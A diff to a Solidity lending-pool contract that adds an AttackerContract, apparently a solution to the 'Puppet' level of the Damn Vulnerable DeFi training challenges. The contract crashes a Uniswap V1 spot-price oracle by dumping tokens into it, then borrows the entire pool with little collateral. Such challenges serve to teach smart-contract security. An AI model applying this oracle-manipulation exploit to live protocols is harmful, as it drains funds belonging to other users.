@@ -5,6 +5,7 @@ pragma solidity =0.8.25;
 import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
 import {Address} from "@openzeppelin/contracts/utils/Address.sol";
 import {DamnValuableToken} from "../DamnValuableToken.sol";
+import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";
 
 contract PuppetPool is ReentrancyGuard {
     using Address for address payable;
@@ -60,4 +61,29 @@ contract PuppetPool is ReentrancyGuard {
         // calculates the price of the token in wei according to Uniswap pair
         return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
     }
+}
+
+contract AttackerContract {
+    DamnValuableToken public immutable token;
+    PuppetPool public immutable pool;
+    IUniswapV1Exchange public immutable uniswapPair;
+    address public immutable recovery;
+
+    constructor(address tokenAddress, address poolAddress, address uniswapPairAddress, address recoveryAddress) {
+        token = DamnValuableToken(tokenAddress);
+        pool = PuppetPool(poolAddress);
+        uniswapPair = IUniswapV1Exchange(uniswapPairAddress);
+        recovery = recoveryAddress;
+    }
+
+    function attack() external {
+        // 1. swap all dvt tokens for eth in the uniswap pair, this will crash the price of dvt in oracle
+        token.approve(address(uniswapPair), token.balanceOf(address(this)));
+        uniswapPair.tokenToEthTransferInput(token.balanceOf(address(this)), 9e18, block.timestamp, address(this));
+        // 2. we have more eth after swap, price is crashed so we can borrow all tokens from lending pool
+        pool.borrow{value: 20e18}(token.balanceOf(address(pool)), recovery);
+    }
+
+    receive() external payable {}
+
 }
